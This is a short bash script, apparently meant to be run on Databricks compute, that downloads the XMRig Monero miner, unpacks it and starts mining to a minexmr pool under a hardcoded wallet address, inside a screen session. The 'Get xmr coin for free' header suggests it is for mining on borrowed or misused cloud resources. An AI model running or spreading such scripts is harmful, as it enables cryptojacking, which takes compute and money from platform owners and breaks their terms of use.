#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
tar xvzf xmrig-6.16.4-focal-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 46KNAoLnz5xDEPdL1z1NbBToUZUwQyuqAe1yDKEBDcuyHzUDSu7AnnCVKWXjKHaYmgV36KxfrUNVb3QL2TFPCZr2QcWvgET -k --tls --rig-id aank
